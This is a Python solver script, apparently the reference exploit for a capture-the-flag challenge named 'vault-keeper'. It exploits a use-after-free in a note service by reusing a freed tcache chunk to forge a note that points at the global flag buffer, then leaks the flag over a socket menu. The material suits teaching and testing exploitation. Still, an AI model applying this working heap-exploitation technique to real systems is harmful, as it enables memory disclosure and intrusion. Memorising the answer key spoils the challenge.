#!/usr/bin/env python3
"""
Reference exploit for vault-keeper.

Use-after-free -> arbitrary read of the fixed-address flag.

The only bug: delete() frees a note's data buffer and its metadata struct but
never clears the slot pointer. We reallocate the freed struct as a data buffer
and forge its {size, data} fields to point a dangling slot at the fixed-address
global flag buffer `g_flag`, then `show` it.

Steps (chunks all land in tcache[0x20]):
  1. create(0, 0x18, "A"*0x18) -> malloc(data0); malloc(struct0).
  2. delete(0)                 -> free(data0); free(struct0). tcache LIFO head =
                                 struct0. notes[0] still dangles at struct0.
  3. create(1, 0x18, payload)  -> the DATA malloc returns struct0 and writes
                                 payload INTO it. payload = p64(128) +
                                 p64(&g_flag) + p64(0) so notes[0] (== struct0)
                                 becomes {size:128, data:&g_flag}.
  4. show(0)                   -> DATA: <flag>.

`&g_flag` is fixed (-no-pie). We resolve it from the binary's symbol table
(pwntools ELF.symbols, else `nm`/`readelf`) — never a hardcoded guess.

    python3 solve.py <ip> <port> [path-to-vault-binary]

Default ip/port: 127.0.0.1 9000. Default binary path: ./vault, /tmp/vault_bin,
or alongside this script (../src is built in-image, so pass the copied binary).
"""
import os
import re
import socket
import struct
import subprocess
import sys

FLAG_RE = re.compile(rb"flag\{[^}]*\}")


def p64(v):
    return struct.pack("<Q", v)


# --- resolve &g_flag from the binary's symbol table ------------------------
def resolve_g_flag(binpath):
    # Prefer pwntools when available (clean and version-robust).
    try:
        from pwn import ELF  # type: ignore
        return ELF(binpath).symbols["g_flag"]
    except Exception:
        pass
    # Fallback: parse `nm`.
    try:
        out = subprocess.check_output(["nm", binpath], text=True)
        for line in out.splitlines():
            parts = line.split()
            if len(parts) == 3 and parts[2] == "g_flag":
                return int(parts[0], 16)
    except Exception:
        pass
    # Fallback: parse `readelf -s`.
    try:
        out = subprocess.check_output(["readelf", "-sW", binpath], text=True)
        for line in out.splitlines():
            if line.rstrip().endswith(" g_flag"):
                # Value: <addr> ... Name: g_flag
                cols = line.split()
                # readelf -s columns: Num: Value Size Type Bind Vis Ndx Name
                return int(cols[1], 16)
    except Exception:
        pass
    raise RuntimeError(f"could not resolve g_flag symbol from {binpath}")


def find_binary(argv_path):
    candidates = []
    if argv_path:
        candidates.append(argv_path)
    here = os.path.dirname(os.path.abspath(__file__))
    candidates += [
        "./vault",
        "/tmp/vault_bin",
        os.path.join(here, "vault"),
        os.path.join(here, "..", "src", "vault"),
    ]
    for c in candidates:
        if c and os.path.isfile(c):
            return c
    raise RuntimeError(
        "vault binary not found; pass its path as argv[3] "
        "(copy it out: docker cp <ctr>:/app/vault /tmp/vault_bin)"
    )


# --- robust menu I/O -------------------------------------------------------
class Conn:
    def __init__(self, ip, port):
        self.s = socket.create_connection((ip, port), timeout=5)
        self.buf = b""

    def recv_until(self, marker, timeout=5):
        self.s.settimeout(timeout)
        while marker not in self.buf:
            try:
                chunk = self.s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            self.buf += chunk
        idx = self.buf.find(marker)
        if idx < 0:
            return None
        out = self.buf[: idx + len(marker)]
        self.buf = self.buf[idx + len(marker):]
        return out

    def send(self, data):
        self.s.sendall(data)

    def menu_prompt(self):
        # Sync on the menu's "> " prompt so each op starts cleanly.
        self.recv_until(b"> ")

    def create(self, idx, size, data):
        self.menu_prompt()
        self.send(b"1\n")
        self.recv_until(b"index> ")
        self.send(str(idx).encode() + b"\n")
        self.recv_until(b"size> ")
        self.send(str(size).encode() + b"\n")
        # data is exactly `size` bytes, no trailing newline.
        assert len(data) == size, "data must be exactly `size` bytes"
        self.send(data)
        self.recv_until(b"OK index=")

    def show(self, idx):
        self.menu_prompt()
        self.send(b"2\n")
        self.recv_until(b"index> ")
        self.send(str(idx).encode() + b"\n")
        hdr = self.recv_until(b"DATA: ")
        if hdr is None:
            return b""
        # After "DATA: " the binary writes exactly `size` bytes then a newline.
        line = self.recv_until(b"\n", timeout=3)
        return line or self.buf

    def delete(self, idx):
        self.menu_prompt()
        self.send(b"4\n")
        self.recv_until(b"index> ")
        self.send(str(idx).encode() + b"\n")
        self.recv_until(b"OK freed")

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def exploit(ip, port, g_flag_addr):
    c = Conn(ip, port)
    try:
        # 1. create(0): data0 (0x20) then struct0 (0x20).
        c.create(0, 0x18, b"A" * 0x18)
        # 2. delete(0): free(data0); free(struct0). notes[0] dangles at struct0.
        c.delete(0)
        # 3. create(1): DATA malloc returns struct0; overwrite it as a forged
        #    note {size:128, data:&g_flag}. 24 bytes == 0x18 size requested.
        payload = p64(128) + p64(g_flag_addr) + p64(0)
        assert len(payload) == 0x18
        c.create(1, 0x18, payload)
        # 4. show(0): dangling notes[0] == struct0 -> {128, &g_flag} -> flag.
        leaked = c.show(0)
        m = FLAG_RE.search(leaked or b"")
        return m.group(0).decode() if m else None
    finally:
        c.close()


def main():
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9000
    binpath = sys.argv[3] if len(sys.argv) > 3 else None

    binary = find_binary(binpath)
    g_flag_addr = resolve_g_flag(binary)
    print(f"[*] g_flag @ {g_flag_addr:#x} (from {binary})", file=sys.stderr)

    flag = exploit(ip, port, g_flag_addr)
    if flag:
        print(flag)
    else:
        print("no flag captured", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
